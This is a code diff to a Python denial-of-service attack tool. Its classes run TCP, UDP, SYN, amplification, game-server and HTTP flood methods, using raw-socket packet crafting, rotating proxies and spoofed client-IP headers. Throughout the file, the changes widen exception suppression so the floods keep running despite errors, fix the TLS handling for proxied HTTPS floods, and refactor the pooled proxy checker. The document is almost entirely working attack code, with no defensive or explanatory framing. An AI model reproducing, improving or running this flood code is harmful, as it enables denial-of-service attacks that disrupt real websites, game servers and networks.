@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-from contextlib import suppress
+from contextlib import suppress, contextmanager
+from functools import partial
 from itertools import cycle
 from json import load
 from math import trunc, log2
@@ -95,7 +96,7 @@ class Proxy:
         return "%s:%d" % (self.host, self.port)
 
     def Check(self, url: str = "https://google.com", timeout: int = 1) -> bool:
-        with suppress(TimeoutError):
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError):
             return get(url, proxies=self.toRequests(), timeout=timeout).status_code not in [403, 400]
         return False
 
@@ -163,7 +164,7 @@ class Layer4(Thread):
             self._amp_payloads = cycle(self._generate_amp())
 
     def TCP(self) -> None:
-        with suppress(TimeoutError), \
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                 socket(AF_INET, SOCK_STREAM, SOL_TCP) as s:
             s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
             s.connect(self._target)
@@ -171,7 +172,7 @@ class Layer4(Thread):
                 continue
 
     def MINECRAFT(self) -> None:
-        with suppress(TimeoutError), \
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                 socket(AF_INET, SOCK_STREAM, SOL_TCP) as s:
             s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
             s.connect(self._target)
@@ -182,27 +183,27 @@ class Layer4(Thread):
                 s.send(b'\x00')
 
     def UDP(self) -> None:
-        with suppress(TimeoutError), \
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                 socket(AF_INET, SOCK_DGRAM) as s:
             while s.sendto(randbytes(1024), self._target):
                 continue
 
     def SYN(self) -> None:
-        with suppress(TimeoutError), \
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                 socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while s.sendto(self._genrate_syn(), self._target):
                 continue
 
     def AMP(self) -> None:
-        with suppress(TimeoutError), \
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                 socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while s.sendto(*next(self._amp_payloads)):
                 continue
 
     def VSE(self) -> None:
-        with suppress(TimeoutError), \
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                 socket(AF_INET, SOCK_DGRAM) as s:
             while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                             b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
@@ -322,12 +323,12 @@ class HttpFlood(Thread):
         return str.encode(f"{payload}\r\n")
 
     def setup_socksocket(self, sock) -> socksocket:
-        if self._target.scheme == "https":
-            sock = ctx.wrap_socket(sock, server_hostname=self._target.host, server_side=False,
-                                   do_handshake_on_connect=True, suppress_ragged_eofs=True)
         if self._proxies:
             proxy: Proxy = next(self._proxies)
             sock.set_proxy(self._proxy_type, proxy.host, proxy.port)
+        if self._target.scheme == "https":
+            sock = ctx.wrap_socket(sock, server_hostname=self._target.host, server_side=False,
+                                   do_handshake_on_connect=True, suppress_ragged_eofs=True)
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         sock.connect((self._target.host, self._target.port or 80))
         return sock
@@ -354,7 +355,7 @@ class HttpFlood(Thread):
                                                 "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\n"
                                                 f"data={Tools.randString(32)}\r\n"))
 
-        with suppress(TimeoutError), self.setup_socksocket(
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                 socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
             for _ in range(self._rpc):
                 s.send(payload)
@@ -367,7 +368,7 @@ class HttpFlood(Thread):
                                                 "Cookie: %s=%s" % (Tools.randString(12),
                                                                    Tools.randString(100))))
 
-        with suppress(TimeoutError), self.setup_socksocket(
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                 socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
             for _ in range(self._rpc):
                 s.send(payload)
@@ -380,13 +381,13 @@ class HttpFlood(Thread):
                                                                Tools.randString(6),
                                                                Tools.randString(32)))
 
-        with suppress(TimeoutError), self.setup_socksocket(
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                 socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
             for _ in range(self._rpc):
                 s.send(payload)
 
     def PPS(self) -> None:
-        with suppress(TimeoutError), self.setup_socksocket(
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                 socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
             for _ in range(self._rpc):
                 s.send(self._defaultpayload)
@@ -394,7 +395,7 @@ class HttpFlood(Thread):
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
 
-        with suppress(TimeoutError), self.setup_socksocket(
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                 socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
             for _ in range(self._rpc):
                 s.send(payload)
@@ -402,7 +403,7 @@ class HttpFlood(Thread):
     def EVEN(self) -> None:
         payload: bytes = self.generate_payload()
 
-        with suppress(TimeoutError), self.setup_socksocket(
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                 socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
             while s.send(payload) and s.recv(1):
                 continue
@@ -410,7 +411,7 @@ class HttpFlood(Thread):
     def OVH(self) -> None:
         payload: bytes = self.generate_payload()
 
-        with suppress(TimeoutError), self.setup_socksocket(
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                 socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
             for _ in range(min(self._rpc, 5)):
                 s.send(payload)
@@ -419,7 +420,7 @@ class HttpFlood(Thread):
         pro = None
         if self._proxies:
             pro = next(self._proxies)
-        with suppress(TimeoutError), \
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                 create_scraper() as s:
             for _ in range(self._rpc):
                 if pro:
@@ -431,7 +432,7 @@ class HttpFlood(Thread):
         pro = None
         if self._proxies:
             pro = next(self._proxies)
-        with suppress(TimeoutError), \
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                 Session() as s:
             for _ in range(self._rpc):
                 if pro:
@@ -440,7 +441,7 @@ class HttpFlood(Thread):
                 s.post(self._target.human_repr())
 
     def DGB(self):
-        with suppress(TimeoutError), \
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                 create_scraper() as s:
             for _ in range(min(self._rpc, 5)):
                 sleep(min(self._rpc, 5) / 100)
@@ -457,7 +458,7 @@ class HttpFlood(Thread):
         payload += self.SpoofIP
         payload = str.encode(f"{payload}\r\n")
 
-        with suppress(TimeoutError), self.setup_socksocket(
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                 socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
             for _ in range(self._rpc):
                 s.send(payload)
@@ -469,7 +470,7 @@ class HttpFlood(Thread):
         payload += self.SpoofIP
         payload = str.encode(f"{payload}\r\n")
 
-        with suppress(TimeoutError), self.setup_socksocket(
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                 socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
             for _ in range(self._rpc):
                 s.send(payload)
@@ -482,7 +483,7 @@ class HttpFlood(Thread):
         payload += self.SpoofIP
         payload = str.encode(f"{payload}\r\n")
 
-        with suppress(TimeoutError), self.setup_socksocket(
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
                 socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
             for _ in range(self._rpc):
                 s.send(payload)
@@ -520,7 +521,7 @@ class HttpFlood(Thread):
         pro = None
         if self._proxies:
             pro = next(self._proxies)
-        with suppress(TimeoutError), \
+        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
                 Session() as s:
             for _ in range(self._rpc):
                 if pro:
@@ -554,13 +555,20 @@ class ProxyManager:
                     proxes.add(Proxy(proy[0], int(proy[1]), provider["type"]))
         return proxes
 
+    @contextmanager
+    def poolcontext(*args, **kwargs):
+        pool = Pool(*args, **kwargs)
+        yield pool
+        pool.terminate()
+
+    @staticmethod
+    def checkProxy(pxy: Proxy, url: str = "http://google.com", timeout: int = 1) -> Tuple[bool, Proxy]:
+        return pxy.Check(timeout=timeout, url=url), pxy
+
     @staticmethod
     def checkAll(proxie: Set[Proxy], url: str = "http://google.com", timeout: int = 1, threads=100) -> Set[Proxy]:
-        def checkProxy(poxy: Proxy) -> Tuple[bool, Proxy]:
-            return poxy.Check(timeout=timeout, url=url), poxy
-
-        return {pro[1] for pro in Pool(min(len(proxie) // cpu_count(), threads)).map(checkProxy, proxie) if pro[0]}
-
+        with ProxyManager.poolcontext(min(len(proxie) // cpu_count(), threads)) as pool:
+            return {pro[1] for pro in pool.map(partial(ProxyManager.checkProxy, url=url, timeout=timeout), proxie) if pro[0]}
 
 class ToolsConsole:
     METHODS = {"INFO", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}
@@ -638,7 +646,7 @@ class ToolsConsole:
 
             if cmd == "CHECK":
                 while True:
-                    with suppress(TimeoutError):
+                    with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError):
                         domain = input(f'{cons}give-me-ipaddress# ')
                         if not domain: continue
                         if domain.upper() == "BACK": break
@@ -847,6 +855,7 @@ if __name__ == '__main__':
                         print("Proxy Count: %d" % len(proxies))
                     for _ in range(threads):
                         HttpFlood(url, method, rpc, event, uagents, referers, proxy_ty, proxies).start()
+
                 if method in Methods.LAYER4_METHODS:
                     target = argv[2].strip()
                     if ":" in target and not target.split(":")[1].isnumeric(): exit("Invalid Port Number")
